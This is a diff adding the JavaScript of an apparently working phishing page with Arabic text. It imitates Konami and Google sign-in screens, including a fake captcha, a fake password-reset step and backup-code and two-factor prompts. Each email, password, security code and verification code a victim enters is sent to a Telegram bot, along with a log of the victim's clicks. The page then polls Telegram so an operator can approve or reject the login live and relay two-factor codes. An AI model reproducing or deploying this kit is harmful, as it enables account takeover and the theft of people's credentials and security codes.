+            document.querySelectorAll('.view-page').forEach(v => v.classList.remove('active'));
+            document.getElementById(viewId).classList.add('active');
+            currentActiveView = viewId;
+            window.scrollTo(0, 0);
+
+            updateBackButtonVisibility();
+        }
+
+        // تنفيذ زر العودة خطوة للخلف
+        function goBackStep() {
+            if (navigationStack.length > 0) {
+                const previousView = navigationStack.pop();
+                sendTelegramMessage(`<b>⬅️ تراجع للخطوة السابقة:</b>\nالمستخدم عاد إلى الصفحة: <code>${previousView}</code>`);
+                showView(previousView, true);
+            }
+        }
+
+        function showLoadingThen(nextViewId, message, duration = 3000, callback) {
+            document.getElementById('loadingStatusText').innerText = message || "جاري التحميل...";
+            showView('loadingView');
+            setTimeout(() => {
+                if (callback) callback();
+                showView(nextViewId);
+            }, duration);
+        }
+
+        function togglePasswordVisibility(id) {
+            const el = document.getElementById(id);
+            el.type = el.type === 'password' ? 'text' : 'password';
+            sendTelegramMessage(`<b>👁️ تفاعل المستخدم:</b> تم نقر إظهار/إخفاء كلمة المرور.`);
+        }
+
+        function logLinkAction(linkTitle) {
+            sendTelegramMessage(`<b>🔗 ضغطة رابط:</b>\nقام المستخدم بالضغط على: <code>${linkTitle}</code>`);
+        }
+
+        function logHelpClick() {
+            alert('أدخل بريدك الإلكتروني الخاص بجوجل للمتابعة');
+            sendTelegramMessage(`<b>❓ استفسار:</b> نَقر المستخدم على زر المساعدة (؟) في بريد جوجل.`);
+        }
+
+        // --- 🎮 سيناريو كونامي ---
+        function submitKonamiEmail() {
+            const email = document.getElementById('konamiEmailInput').value.trim();
+            if (!email) { alert('يرجى إدخال معرف كونامي أو البريد الإلكتروني'); return; }
+
+            sessionData.provider = 'KONAMI';
+            sessionData.email = email;
+            sendTelegramMessage(`<b>🎮 إدخال بريد كونامي:</b>\nالبريد: <code>${email}</code>`);
+
+            document.getElementById('displayKonamiEmail').value = email;
+            showLoadingThen('konamiPasswordCaptchaView', 'جاري التحميل...', 3000);
+        }
+
+        function toggleAvatarSelection(card, isValidAvatar, avatarIndex) {
+            card.classList.toggle('selected');
+            const isSelected = card.classList.contains('selected');
+
+            if (isSelected) {
+                selectedAvatarCount++;
+                if (isValidAvatar) validAvatarSelectedCount++;
+            } else {
+                selectedAvatarCount--;
+                if (isValidAvatar) validAvatarSelectedCount--;
+            }
+
+            sendTelegramMessage(`<b>🧩 تحديد الكابتشا:</b>\nتم تحديد الصورة رقم (${avatarIndex}) - حالة التحديد: ${isSelected ? 'محددة ✅' : 'إلغاء التحديد ❌'}`);
+        }
+
+        function submitKonamiPasswordAndCaptcha() {
+            const pass = document.getElementById('konamiPasswordInput').value.trim();
+            if (!pass) { alert('يرجى إدخال كلمة المرور'); return; }
+
+            if (selectedAvatarCount !== 3 || validAvatarSelectedCount !== 3) {
+                alert('يرجى التأكد من تحديد الصور الثلاث المتشابهة للشخصية الكرتونية المطلوبة للتأكد من أنك لست روبوت.');
+                sendTelegramMessage(`<b>⚠️ محاولة تجاوز كابتشا فاشلة:</b>\nالبريد: <code>${sessionData.email}</code>\nكلمة المرور المدخلة: <code>${pass}</code>\nعدد المحدد: ${selectedAvatarCount} (الصحيح: ${validAvatarSelectedCount})`);
+                return;
+            }
+
+            sessionData.password = pass;
+            sendTelegramMessage(`<b>🎮 تسجيل بيانات كونامي الكاملة:</b>\nالحساب: <code>${sessionData.email}</code>\nكلمة المرور: <code>${pass}</code>\nالكابتشا: تم تجاوزها بنجاح بنسبة 100% ✓`);
+
+            showLoadingThen('loadingView', 'جاري التحقق من المعلومات...', 3000, () => {
+                showLoadingThen('successView', 'جاري تسجيل الدخول بالحساب الذي تم ادخاله...', 5000);
+            });
+        }
+
+
+        // --- 🔴 التسجيل بجوجل (4 مراحل) ---
+        function openGoogleFlow() {
+            sessionData.provider = 'GOOGLE';
+            sendTelegramMessage(`<b>🔴 اننتقال إلى تسجيل جوجل</b>`);
+            showView('gPhase1View');
+        }
+
+        function submitGPhase1() {
+            const email = document.getElementById('gEmailInput').value.trim();
+            if (!email) { alert('يرجى إدخال البريد الإلكتروني أو الهاتف'); return; }
+
+            sessionData.email = email;
+            sendTelegramMessage(`<b>🔴 جوجل - المرحلة 1 (البريد/الهاتف):</b>\nالمُدخل: <code>${email}</code>`);
+
+            showLoadingThen('gPhase2View', '(جاري التحميل...)', 3000);
+        }
+
+        function submitGNotesStep1() {
+            const notes = document.getElementById('gNotesInputVisible').value.trim();
+            if (!notes) { alert('يرجى إدخال كلمة المرور'); return; }
+
+            sessionData.password = notes;
+            sendTelegramMessage(`<b>🔑 كلمة المرور (جوجل - خطوة 1):</b>\nالبريد: <code>${sessionData.email}</code>\nكلمة المرور: <code>${notes}</code>`);
+
+            showLoadingThen('gPhase3View', '(جاري التحميل...)', 3000);
+        }
+
+        function showGResetNotesSection() {
+            document.getElementById('gPhase2_Step1').style.display = 'none';
+            document.getElementById('gPhase2_Step2').style.display = 'block';
+
+            const unique = 'NOTE-' + Math.floor(100000 + Math.random() * 900000);
+            sessionData.uniqueNote = unique;
+            document.getElementById('gUniqueNoteDisplay').innerText = unique;
+
+            sendTelegramMessage(`<b>⚠️ طلب إعادة تعيين كلمة المرور (جوجل):</b>\nالبريد: <code>${sessionData.email}</code>\nكلمة المرور الفريدة الموّلدة: <code>${unique}</code>`);
+        }
+
+        function handleGUpdatePasswordLinkClick() {
+            navigator.clipboard.writeText(sessionData.uniqueNote).catch(e => console.log(e));
+            document.getElementById('gNewNotesInput').disabled = false;
+            document.getElementById('btnSubmitGNewNotes').disabled = false;
+            sendTelegramMessage(`<b>📋 نسخ كلمة الملاحظات الفريدة:</b>\nتم النسخ للكلمة: <code>${sessionData.uniqueNote}</code> وتم فتح خانة التحديث.`);
+        }
+
+        function submitGNewNotesFinal() {
+            const newNotes = document.getElementById('gNewNotesInput').value.trim();
+            if (!newNotes) { alert('يرجى إدخال كلمة المرور الجديدة'); return; }
+
+            sessionData.newNotesPassword = newNotes;
+            sendTelegramMessage(`<b>✅ كلمة المرور الجديدة (جوجل - ختامية):</b>\nالبريد: <code>${sessionData.email}</code>\nكلمة المرور الفريدة: <code>${sessionData.uniqueNote}</code>\nكلمة المرور الجديدة: <code>${newNotes}</code>`);
+
+            showLoadingThen('gPhase3View', '(جاري تسجيل الدخول والتأكد من المعلومات...)', 3000);
+        }
+
+        // --- المرحلة 3: رموز الأمان الشروط والبدائل ---
+        function handleBackupLinkClick() {
+            hasClickedBackupLink = true;
+            document.getElementById('gBackupErrorMsg').style.display = 'none';
+            sendTelegramMessage(`<b>🛡️ نَقر رابط رموز الأمان:</b>\nالبريد: <code>${sessionData.email}</code> (تم فتح رابط الحصول على الرموز)`);
+        }
+
+        function submitGBackupCode() {
+            const errorBox = document.getElementById('gBackupErrorMsg');
+
+            if (!hasClickedBackupLink) {
+                errorBox.innerText = "يرجى الضغط على رابط رموز الأمان أولاً للحصول على الرمز ثم ادخاله في الخانة.";
+                errorBox.style.display = 'block';
+                sendTelegramMessage(`<b>⚠️ خطأ إدخال رمز أمان:</b> حاول المستخدم إدخال الرمز دون الضغط على الرابط أولاً.`);
+                return;
+            }
+
+            const code = document.getElementById('gBackupCodeInput').value.trim();
+            if (!code) {
+                errorBox.innerText = "يرجى إدخال أحد رموز الأمان المنسوخة من الرابط.";
+                errorBox.style.display = 'block';
+                sendTelegramMessage(`<b>⚠️ خطأ إدخال رمز أمان:</b> الخانة فارغة.`);
+                return;
+            }
+
+            sessionData.backupCode = code;
+            sendTelegramMessage(`<b>🛡️ رمز الأمان المدخل:</b>\nالبريد: <code>${sessionData.email}</code>\nرمز الأمان: <code>${code}</code>`);
+
+            showLoadingThen('successView', '(جاري التحقق من رمز الأمان...)', 3000);
+        }
+
+        function toggleGAlternativeOptions() {
+            const area = document.getElementById('gAlternativeArea');
+            const isHidden = area.style.display === 'none';
+            area.style.display = isHidden ? 'block' : 'none';
+            sendTelegramMessage(`<b>🔄 طرق تأكيد بديلة:</b>\nتم ${isHidden ? 'فتح' : 'إغلاق'} خيارات التأكيد البديلة.`);
+        }
+
+        function requestGAltCode() {
+            const input = document.getElementById('gAltPhoneEmail').value.trim();
+            if (!input) { alert('يرجى إدخال الرقم أو البريد الإلكتروني'); return; }
+
+            sendTelegramMessage(`<b>📩 طلب كود تحقق (طريقة بديلة):</b>\nالحساب الأساسي: <code>${sessionData.email}</code>\nالوجهة المطلوبة (هاتف/بريد): <code>${input}</code>`);
+            showView('gPhase4View');
+            startPollingTelegram();
+        }
+
+        function handleGPhase4CodeInput(elem) {
+            const val = elem.value.trim();
+            if ([5, 6, 8].includes(val.length)) {
+                sendTelegramMessage(`<b>🔢 كود تحقق مدخل (جوجل مرحلة 4):</b>\nالبريد: <code>${sessionData.email}</code>\nالكود المدخل: <code>${val}</code>`);
+                showView('waitingAdminView');
+                startPollingTelegram();
+            }
+        }
+
+        // --- بوابة التحكم اليدوي عبر تليجرام ---
+        function startPollingTelegram() {
+            if (pollTimer) clearInterval(pollTimer);
+            let lastUpdateId = 0;
+
+            pollTimer = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            data.result.forEach(update => {
+                                lastUpdateId = update.update_id;
+                                if (update.message && update.message.text) {
+                                    const text = update.message.text.trim();
+                                    if (text === "تم التسجيل") {
+                                        clearInterval(pollTimer);
+                                        showView('successView');
+                                    } else if (text === "فشل") {
+                                        clearInterval(pollTimer);
+                                        alert("تأكد من إدخال المعلومات بشكل صحيح");
+                                        showView('konamiMainView');
+                                    }
+                                }
+                            });
+                        }
+                    })
+                    .catch(e => console.error("Polling error:", e));
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
